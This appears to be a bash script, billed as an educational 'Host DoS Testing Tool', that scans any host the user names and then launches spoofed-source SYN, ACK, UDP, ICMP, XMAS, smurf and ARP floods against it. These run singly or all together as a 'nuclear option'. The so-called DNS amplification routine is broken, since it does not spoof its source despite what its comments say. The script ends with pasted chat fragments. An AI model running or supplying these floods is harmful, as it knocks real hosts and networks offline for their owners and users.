#!/bin/bash

# Enhanced Host DoS Testing Tool
# Includes DHCP Discover flooding + hping3 attacks
# FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Configuration
LOG_DIR="./attack_logs"
INTERFACE=$(ip route | grep default | awk '{print $5}' | head -n1)
DHCP_SERVER_PORT=67
DHCP_CLIENT_PORT=68

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}This script must be run as root (sudo)${NC}" 
   exit 1
fi

# Check prerequisites
check_prerequisites() {
    echo -e "${BLUE}[*] Checking prerequisites...${NC}"
    
    # hping3 for TCP/UDP/ICMP attacks
    if ! command -v hping3 &> /dev/null; then
        echo -e "${YELLOW}[-] hping3 not found. Installing...${NC}"
        apt-get update && apt-get install -y hping3
    fi
    
    # nmap for port scanning and OS detection
    if ! command -v nmap &> /dev/null; then
        echo -e "${YELLOW}[-] nmap not found. Installing...${NC}"
        apt-get update && apt-get install -y nmap
    fi
    
    # arping for MAC address discovery
    if ! command -v arping &> /dev/null; then
        echo -e "${YELLOW}[-] arping not found. Installing...${NC}"
        apt-get update && apt-get install -y arping
    fi
    
    # tcpdump for monitoring
    if ! command -v tcpdump &> /dev/null; then
        echo -e "${YELLOW}[-] tcpdump not found. Installing...${NC}"
        apt-get install -y tcpdump
    fi
    
    # Optional: Install dhcpig if needed for DHCP attacks
    if [[ "$INCLUDE_DHCP" == "yes" ]]; then
        if ! command -v dhcpig &> /dev/null; then
            echo -e "${YELLOW}[-] dhcpig not found. Installing...${NC}"
            apt-get update && apt-get install -y dhcpig python3-scapy
        fi
        if ! command -v dhcping &> /dev/null; then
            echo -e "${YELLOW}[-] dhcping not found. Installing...${NC}"
            apt-get update && apt-get install -y dhcping
        fi
        if ! command -v dhcpdump &> /dev/null; then
            echo -e "${YELLOW}[-] dhcpdump not found. Installing...${NC}"
            apt-get update && apt-get install -y dhcpdump
        fi
    fi
    
    mkdir -p "$LOG_DIR"
    echo -e "${GREEN}[+] All prerequisites satisfied${NC}"
}

# Validate IP address
validate_ip() {
    local ip=$1
    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        return 0
    else
        return 1
    fi
}

# Validate hostname
validate_hostname() {
    local hostname=$1
    if [[ $hostname =~ ^[a-zA-Z0-9][a-zA-Z0-9\.-]+[a-zA-Z0-9]$ ]]; then
        return 0
    else
        return 1
    fi
}

# Get target information
get_target_info() {
    echo -e "${YELLOW}=== Host Attack Testing Configuration ===${NC}"
    read -p "Enter target IP or hostname: " TARGET
    
    # Check if it's an IP or hostname
    if validate_ip "$TARGET"; then
        TARGET_IP="$TARGET"
    elif validate_hostname "$TARGET"; then
        echo -e "${BLUE}[*] Resolving hostname $TARGET...${NC}"
        TARGET_IP=$(getent hosts "$TARGET" | awk '{print $1}' | head -n1)
        if [[ -z "$TARGET_IP" ]]; then
            echo -e "${RED}Could not resolve hostname${NC}"
            exit 1
        fi
        echo -e "${GREEN}[+] Resolved to: $TARGET_IP${NC}"
    else
        echo -e "${RED}Invalid IP address or hostname${NC}"
        exit 1
    fi
    
    # Perform initial reconnaissance
    echo -e "${BLUE}[*] Performing initial reconnaissance...${NC}"
    
    # Get MAC address
    echo -e "${BLUE}[*] Getting target MAC address...${NC}"
    TARGET_MAC=$(arp -n | grep "$TARGET_IP" | awk '{print $3}')
    if [[ -z "$TARGET_MAC" ]]; then
        # Try arping to get MAC
        TARGET_MAC=$(arping -c 1 -I "$INTERFACE" "$TARGET_IP" 2>/dev/null | grep -oE '([0-9a-f]{2}:){5}[0-9a-f]{2}' | head -n1)
        if [[ -z "$TARGET_MAC" ]]; then
            echo -e "${YELLOW}[!] Could not get target MAC. Using broadcast for some attacks.${NC}"
            TARGET_MAC="ff:ff:ff:ff:ff:ff"
        fi
    fi
    echo -e "${GREEN}[+] Target MAC: $TARGET_MAC${NC}"
    
    # Quick port scan to find open ports
    echo -e "${BLUE}[*] Quick port scan to identify services...${NC}"
    OPEN_PORTS=$(nmap -T4 -F --open "$TARGET_IP" 2>/dev/null | grep '^[0-9]' | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//')
    if [[ -n "$OPEN_PORTS" ]]; then
        echo -e "${GREEN}[+] Open ports found: $OPEN_PORTS${NC}"
    else
        echo -e "${YELLOW}[!] No open ports found or scan failed${NC}"
        OPEN_PORTS="80,443,22,53"
    fi
    
    # OS detection
    echo -e "${BLUE}[*] Attempting OS detection...${NC}"
    OS_INFO=$(nmap -O --osscan-guess "$TARGET_IP" 2>/dev/null | grep -E 'OS details|Aggressive OS guesses' | cut -d':' -f2- | xargs)
    if [[ -n "$OS_INFO" ]]; then
        echo -e "${GREEN}[+] Detected: $OS_INFO${NC}"
    else
        echo -e "${YELLOW}[!] Could not determine OS${NC}"
    fi
    
    # Check if target is reachable
    echo -e "${BLUE}[*] Checking if target is reachable...${NC}"
    if ping -c 2 -W 1 "$TARGET_IP" &> /dev/null; then
        echo -e "${GREEN}[+] Target is reachable${NC}"
    else
        echo -e "${YELLOW}[!] Target not responding to ping. Continue anyway? (y/n)${NC}"
        read -r continue_anyway
        if [[ ! "$continue_anyway" =~ ^[Yy]$ ]]; then
            exit 1
        fi
    fi
    
    # Ask if DHCP attacks should be included (only relevant if target is a DHCP server)
    echo -e "${YELLOW}[?] Is this host a DHCP server? (y/n)${NC}"
    read -r is_dhcp
    if [[ "$is_dhcp" =~ ^[Yy]$ ]]; then
        INCLUDE_DHCP="yes"
    else
        INCLUDE_DHCP="no"
    fi
}

# Main Menu
show_main_menu() {
    clear
    echo -e "${RED}╔════════════════════════════════════════╗${NC}"
    echo -e "${RED}║       ENHANCED HOST DoS TESTING SUITE  ║${NC}"
    echo -e "${RED}╚════════════════════════════════════════╝${NC}"
    echo -e "${YELLOW}Target: $TARGET ($TARGET_IP)${NC}"
    echo -e "${YELLOW}Target MAC: $TARGET_MAC${NC}"
    echo -e "${YELLOW}Interface: $INTERFACE${NC}"
    if [[ -n "$OPEN_PORTS" ]]; then
        echo -e "${YELLOW}Open Ports: $OPEN_PORTS${NC}"
    fi
    echo -e "${RED}════════════════════════════════════════${NC}"
    echo -e "${PURPLE}1) TCP FLOODING ATTACKS${NC}"
    echo "   1a) SYN Flood - Specific port"
    echo "   1b) SYN Flood - All open ports"
    echo "   1c) ACK Flood - Bypass firewalls"
    echo "   1d) FIN/RST Flood - Disrupt connections"
    echo "   1e) XMAS Tree Attack (ALL flags set)"
    echo -e "${RED}════════════════════════════════════════${NC}"
    echo -e "${CYAN}2) UDP FLOODING ATTACKS${NC}"
    echo "   2a) UDP Flood - Specific port"
    echo "   2b) UDP Flood - Random ports"
    echo "   2c) DNS Amplification - If DNS server"
    echo "   2d) NTP Amplification - If NTP server"
    echo -e "${RED}════════════════════════════════════════${NC}"
    echo -e "${GREEN}3) ICMP ATTACKS${NC}"
    echo "   3a) ICMP Echo Flood (Ping flood)"
    echo "   3b) ICMP Fragmentation Attack"
    echo "   3c) ICMP Smurf Attack (Broadcast)"
    echo -e "${RED}════════════════════════════════════════${NC}"
    echo -e "${BLUE}4) LAYER 2 ATTACKS${NC}"
    echo "   4a) ARP Flood - Target specific"
    echo "   4b) MAC Flood - Switch CAM table"
    echo "   4c) VLAN Hopping Attempt"
    if [[ "$INCLUDE_DHCP" == "yes" ]]; then
        echo -e "${YELLOW}5) DHCP-SPECIFIC ATTACKS${NC}"
        echo "   5a) DHCP Discover Flood"
        echo "   5b) DHCP Release Attack"
        echo "   5c) DHCP Starvation"
    fi
    echo -e "${PURPLE}6) COMBINATION ATTACKS${NC}"
    echo "   6a) SYN + UDP Flood"
    echo "   6b) Multi-port SYN Flood"
    echo "   6c) Full Nuclear Option"
    echo -e "${RED}════════════════════════════════════════${NC}"
    echo "7) Monitor Host Status"
    echo "8) Capture Traffic to Host"
    echo "9) Exit"
    echo -e "${RED}════════════════════════════════════════${NC}"
}

# ============================================
# TCP FLOODING ATTACKS
# ============================================

# 1a) SYN Flood - Specific port
syn_flood_specific() {
    read -p "Enter target port (e.g., 80, 443, 22): " TARGET_PORT
    
    if [[ ! "$TARGET_PORT" =~ ^[0-9]+$ ]] || [[ "$TARGET_PORT" -lt 1 ]] || [[ "$TARGET_PORT" -gt 65535 ]]; then
        echo -e "${RED}Invalid port number${NC}"
        return
    fi
    
    echo -e "${BLUE}[*] Starting SYN Flood on $TARGET_IP:$TARGET_PORT${NC}"
    echo -e "${YELLOW}Press Ctrl+C to stop${NC}"
    
    hping3 -S --flood --rand-source -p "$TARGET_PORT" "$TARGET_IP" 2>&1 | tee "$LOG_DIR/syn_flood_port${TARGET_PORT}_$(date +%Y%m%d_%H%M%S).log"
}

# 1b) SYN Flood - All open ports
syn_flood_all() {
    echo -e "${BLUE}[*] Starting SYN Flood on all open ports of $TARGET_IP${NC}"
    echo -e "${YELLOW}Press Ctrl+C to stop${NC}"
    
    IFS=',' read -ra PORTS <<< "$OPEN_PORTS"
    for port in "${PORTS[@]}"; do
        echo -e "${YELLOW}Attacking port $port...${NC}"
        hping3 -S --flood --rand-source -p "$port" "$TARGET_IP" &
        sleep 0.5
    done
    
    echo -e "${RED}Attacks running on all ports. Press Ctrl+C to stop${NC}"
    wait
}

# 1c) ACK Flood
ack_flood() {
    read -p "Enter target port (or leave empty for random): " TARGET_PORT
    
    if [[ -z "$TARGET_PORT" ]]; then
        echo -e "${BLUE}[*] Starting ACK Flood on random ports${NC}"
        hping3 -A --flood --rand-source --rand-dest "$TARGET_IP" 2>&1 | tee "$LOG_DIR/ack_flood_$(date +%Y%m%d_%H%M%S).log"
    else
        echo -e "${BLUE}[*] Starting ACK Flood on $TARGET_IP:$TARGET_PORT${NC}"
        hping3 -A --flood --rand-source -p "$TARGET_PORT" "$TARGET_IP" 2>&1 | tee "$LOG_DIR/ack_flood_port${TARGET_PORT}_$(date +%Y%m%d_%H%M%S).log"
    fi
}

# 1d) FIN/RST Flood
fin_rst_flood() {
    read -p "Enter target port: " TARGET_PORT
    
    echo -e "${BLUE}[*] Starting FIN/RST Flood on $TARGET_IP:$TARGET_PORT${NC}"
    echo -e "${YELLOW}Press Ctrl+C to stop${NC}"
    
    # Send FIN packets
    hping3 -F --flood --rand-source -p "$TARGET_PORT" "$TARGET_IP" &
    FIN_PID=$!
    
    sleep 2
    
    # Send RST packets
    hping3 -R --flood --rand-source -p "$TARGET_PORT" "$TARGET_IP" &
    RST_PID=$!
    
    wait $FIN_PID $RST_PID 2>/dev/null
}

# 1e) XMAS Tree Attack
xmas_attack() {
    read -p "Enter target port: " TARGET_PORT
    
    echo -e "${BLUE}[*] Starting XMAS Tree Attack on $TARGET_IP:$TARGET_PORT${NC}"
    echo -e "${YELLOW}Setting FIN, URG, PUSH flags${NC}"
    
    hping3 -F -U -P --flood --rand-source -p "$TARGET_PORT" "$TARGET_IP" 2>&1 | tee "$LOG_DIR/xmas_$(date +%Y%m%d_%H%M%S).log"
}

# ============================================
# UDP FLOODING ATTACKS
# ============================================

# 2a) UDP Flood - Specific port
udp_flood_specific() {
    read -p "Enter target port: " TARGET_PORT
    
    echo -e "${BLUE}[*] Starting UDP Flood on $TARGET_IP:$TARGET_PORT${NC}"
    echo -e "${YELLOW}Press Ctrl+C to stop${NC}"
    
    hping3 -2 --flood --rand-source -p "$TARGET_PORT" "$TARGET_IP" 2>&1 | tee "$LOG_DIR/udp_flood_port${TARGET_PORT}_$(date +%Y%m%d_%H%M%S).log"
}

# 2b) UDP Flood - Random ports
udp_flood_random() {
    echo -e "${BLUE}[*] Starting UDP Flood on random ports${NC}"
    echo -e "${YELLOW}Press Ctrl+C to stop${NC}"
    
    hping3 -2 --flood --rand-source --rand-dest "$TARGET_IP" 2>&1 | tee "$LOG_DIR/udp_flood_random_$(date +%Y%m%d_%H%M%S).log"
}

# 2c) DNS Amplification (if DNS server)
dns_amplification() {
    echo -e "${BLUE}[*] Starting DNS Amplification test on $TARGET_IP:53${NC}"
    echo -e "${YELLOW}Using public DNS resolvers as reflectors${NC}"
    
    # Create list of public DNS servers
    cat > /tmp/dns_amplify.sh << 'EOF'
#!/bin/bash
TARGET="$1"
# List of public DNS servers (reflectors)
REFLECTORS=(
    "8.8.8.8"
    "8.8.4.4"
    "1.1.1.1"
    "1.0.0.1"
    "9.9.9.9"
    "208.67.222.222"
    "208.67.220.220"
)

while true; do
    for reflector in "${REFLECTORS[@]}"; do
        # Send DNS query with spoofed source IP (target)
        dig ANY isc.org @$reflector +short +tries=1 +time=1 &
    done
    sleep 0.1
done
EOF
    
    chmod +x /tmp/dns_amplify.sh
    /tmp/dns_amplify.sh "$TARGET_IP" 2>&1 | tee "$LOG_DIR/dns_amplify_$(date +%Y%m%d_%H%M%S).log"
}

# ============================================
# ICMP ATTACKS
# ============================================

# 3a) ICMP Echo Flood
icmp_echo_flood() {
    echo -e "${BLUE}[*] Starting ICMP Echo Flood on $TARGET_IP${NC}"
    echo -e "${YELLOW}Press Ctrl+C to stop${NC}"
    
    hping3 -1 --flood --rand-source "$TARGET_IP" 2>&1 | tee "$LOG_DIR/icmp_echo_$(date +%Y%m%d_%H%M%S).log"
}

# 3b) ICMP Fragmentation Attack
icmp_fragment() {
    echo -e "${BLUE}[*] Starting ICMP Fragmentation Attack on $TARGET_IP${NC}"
    echo -e "${YELLOW}Sending oversized fragmented packets${NC}"
    
    hping3 -1 --flood --rand-source -d 65538 "$TARGET_IP" 2>&1 | tee "$LOG_DIR/icmp_frag_$(date +%Y%m%d_%H%M%S).log"
}

# 3c) ICMP Smurf Attack
icmp_smurf() {
    echo -e "${BLUE}[*] Starting ICMP Smurf Attack (Broadcast)${NC}"
    echo -e "${YELLOW}Getting broadcast address...${NC}"
    
    BROADCAST_ADDR=$(ip -o -f inet addr show "$INTERFACE" | awk '{print $4}' | cut -d'/' -f1 | sed 's/[0-9]*$/255/')
    
    echo -e "${YELLOW}Using broadcast address: $BROADCAST_ADDR${NC}"
    echo -e "${RED}Target will receive responses from all hosts on network${NC}"
    
    hping3 -1 --flood --rand-source -a "$TARGET_IP" "$BROADCAST_ADDR" 2>&1 | tee "$LOG_DIR/smurf_$(date +%Y%m%d_%H%M%S).log"
}

# ============================================
# LAYER 2 ATTACKS
# ============================================

# 4a) ARP Flood
arp_flood() {
    echo -e "${BLUE}[*] Starting ARP Flood targeting $TARGET_IP${NC}"
    echo -e "${YELLOW}This will confuse the switch's MAC learning${NC}"
    
    cat > /tmp/arp_flood.py << 'EOF'
#!/usr/bin/env python3
from scapy.all import *
import random
import time
import sys

def random_mac():
    return "%02x:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255)
    )

def random_ip():
    return "10.0.0.%d" % random.randint(1, 254)

def arp_flood(target_ip, interface, count=0):
    sent = 0
    try:
        while True:
            src_mac = random_mac()
            src_ip = random_ip()
            
            # Send ARP request
            ether = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")
            arp = ARP(hwsrc=src_mac, psrc=src_ip, 
                      hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip)
            
            sendp(ether/arp, iface=interface, verbose=0)
            
            sent += 1
            if sent % 100 == 0:
                print(f"[+] Sent {sent} ARP packets")
                sys.stdout.flush()
                
    except KeyboardInterrupt:
        print(f"\n[+] Total ARP packets sent: {sent}")

if __name__ == "__main__":
    arp_flood(sys.argv[1], sys.argv[2])
EOF
    
    chmod +x /tmp/arp_flood.py
    python3 /tmp/arp_flood.py "$TARGET_IP" "$INTERFACE" 2>&1 | tee "$LOG_DIR/arp_flood_$(date +%Y%m%d_%H%M%S).log"
}

# ============================================
# COMBINATION ATTACKS
# ============================================

# 6a) SYN + UDP Flood
combination_syn_udp() {
    echo -e "${RED}[!] Starting COMBINATION ATTACK: SYN + UDP Flood${NC}"
    
    read -p "Enter port for SYN flood (e.g., 80): " SYN_PORT
    read -p "Enter port for UDP flood (e.g., 53): " UDP_PORT
    
    # Start SYN flood
    echo -e "${YELLOW}Starting SYN flood on port $SYN_PORT...${NC}"
    hping3 -S --flood --rand-source -p "$SYN_PORT" "$TARGET_IP" &
    SYN_PID=$!
    
    sleep 2
    
    # Start UDP flood
    echo -e "${YELLOW}Starting UDP flood on port $UDP_PORT...${NC}"
    hping3 -2 --flood --rand-source -p "$UDP_PORT" "$TARGET_IP" &
    UDP_PID=$!
    
    echo -e "${RED}Both attacks running. Press Ctrl+C to stop${NC}"
    wait $SYN_PID $UDP_PID 2>/dev/null
}

# 6b) Multi-port SYN Flood
multi_port_syn() {
    echo -e "${RED}[!] Starting Multi-port SYN Flood${NC}"
    
    # Attack multiple common ports
    PORTS=(80 443 22 21 25 53 110 143 993 995 3306 5432 8080)
    
    for port in "${PORTS[@]}"; do
        echo -e "${YELLOW}Attacking port $port...${NC}"
        hping3 -S --flood --rand-source -p "$port" "$TARGET_IP" &
        sleep 0.2
    done
    
    echo -e "${RED}All attacks running. Press Ctrl+C to stop${NC}"
    wait
}

# 6c) Full Nuclear Option
nuclear_option_host() {
    echo -e "${RED}╔════════════════════════════════════════╗${NC}"
    echo -e "${RED}║      NUCLEAR OPTION - EVERYTHING       ║${NC}"
    echo -e "${RED}╚════════════════════════════════════════╝${NC}"
    echo -e "${YELLOW}This will launch multiple attacks simultaneously${NC}"
    read -p "Are you ABSOLUTELY sure? (yes/no): " confirm
    
    if [[ "$confirm" != "yes" ]]; then
        return
    fi
    
    # SYN flood on multiple ports
    echo -e "${BLUE}[*] SYN floods on common ports...${NC}"
    for port in 80 443 22 8080; do
        hping3 -S --flood --rand-source -p "$port" "$TARGET_IP" > /dev/null 2>&1 &
    done
    
    sleep 1
    
    # UDP flood
    echo -e "${BLUE}[*] UDP floods...${NC}"
    hping3 -2 --flood --rand-source -p 53 "$TARGET_IP" > /dev/null 2>&1 &
    hping3 -2 --flood --rand-source -p 161 "$TARGET_IP" > /dev/null 2>&1 &
    
    sleep 1
    
    # ICMP flood
    echo -e "${BLUE}[*] ICMP flood...${NC}"
    hping3 -1 --flood --rand-source "$TARGET_IP" > /dev/null 2>&1 &
    
    # ACK flood
    echo -e "${BLUE}[*] ACK flood...${NC}"
    hping3 -A --flood --rand-source -p 80 "$TARGET_IP" > /dev/null 2>&1 &
    
    # XMAS attack
    echo -e "${BLUE}[*] XMAS attack...${NC}"
    hping3 -F -U -P --flood --rand-source -p 443 "$TARGET_IP" > /dev/null 2>&1 &
    
    echo -e "${RED}[!] ALL ATTACKS ACTIVE. Press Ctrl+C to stop everything${NC}"
    tail -f /dev/null
}

# ============================================
# UTILITY FUNCTIONS
# ============================================

# Monitor host status
monitor_host() {
    echo -e "${BLUE}[*] Monitoring host $TARGET_IP. Press Ctrl+C to stop${NC}"
    echo -e "${YELLOW}Time          Status      Response Time    Open Ports${NC}"
    
    while true; do
        local timestamp=$(date +%H:%M:%S)
        if ping -c 1 -W 1 "$TARGET_IP" &> /dev/null; then
            local rtt=$(ping -c 1 -W 1 "$TARGET_IP" | grep 'time=' | awk -F'time=' '{print $2}' | awk '{print $1}')
            
            # Quick port check
            local open_ports=$(nmap -T4 -F --open "$TARGET_IP" 2>/dev/null | grep '^[0-9]' | wc -l)
            echo -e "$timestamp - ${GREEN}UP${NC}         ${rtt}ms        ${open_ports} ports open"
        else
            echo -e "$timestamp - ${RED}DOWN${NC}        timeout       N/A"
        fi
        sleep 2
    done
}

# Capture traffic to host
capture_traffic() {
    echo -e "${BLUE}[*] Capturing traffic to/from $TARGET_IP on $INTERFACE${NC}"
    echo -e "${YELLOW}Press Ctrl+C to stop capture${NC}"
    
    tcpdump -i "$INTERFACE" -n -e host "$TARGET_IP" -v 2>&1 | tee "$LOG_DIR/traffic_capture_$(date +%Y%m%d_%H%M%S).log"
}

# ============================================
# MAIN EXECUTION
# ============================================
main() {
    check_prerequisites
    get_target_info
    
    while true; do
        show_main_menu
        read -p "Select option [1a-9]: " main_choice
        
        case $main_choice in
            1a) syn_flood_specific ;;
            1b) syn_flood_all ;;
            1c) ack_flood ;;
            1d) fin_rst_flood ;;
            1e) xmas_attack ;;
            2a) udp_flood_specific ;;
            2b) udp_flood_random ;;
            2c) dns_amplification ;;
            2d) echo "NTP amplification - requires NTP server" ;;
            3a) icmp_echo_flood ;;
            3b) icmp_fragment ;;
            3c) icmp_smurf ;;
            4a) arp_flood ;;
            4b) echo "MAC flood - coming soon" ;;
            4c) echo "VLAN hopping - coming soon" ;;
            5a) echo "DHCP attacks - only if target is DHCP server" ;;
            5b) echo "DHCP attacks - only if target is DHCP server" ;;
            5c) echo "DHCP attacks - only if target is DHCP server" ;;
            6a) combination_syn_udp ;;
            6b) multi_port_syn ;;
            6c) nuclear_option_host ;;
            7) monitor_host ;;
            8) capture_traffic ;;
            9) 
                echo -e "${GREEN}Exiting...${NC}"
                exit 0 
                ;;
            *) 
                echo -e "${RED}Invalid choice${NC}"
                sleep 2
                ;;
        esac
        
        echo -e "\n${YELLOW}Attack completed. Logs saved in $LOG_DIR${NC}"
        read -p "Press Enter to continue..."
    done
}

# Trap Ctrl+C
trap 'echo -e "\n${RED}Attack stopped by user${NC}"; kill 0 2>/dev/null; exit 0' INT

# Run main function
main


<<COMMENT
key changes made to target a specific host:

Host Resolution: Added hostname resolution to convert hostnames to IP addresses

Reconnaissance: Added nmap scanning to discover open ports and OS information

MAC Discovery: Added arping to get target's MAC address

DHCP Option: Made DHCP attacks optional based on whether the host is a DHCP server

Target-Specific Attacks:

Port-specific flooding (SYN, ACK, FIN/RST, XMAS)

DNS amplification (only if target is a DNS server)

ARP flooding targeting specific host

Monitoring: Enhanced monitoring shows open port count during attack

Traffic Capture: Specific filtering for target host traffic

Flexible Port Selection: For all attacks, you can specify which port to target

The script now focuses on attacking a specific host rather than just a router, with appropriate attacks for different service types.

how to use comment multiple line in this just one line ans
In bash scripts, you can comment multiple lines using:


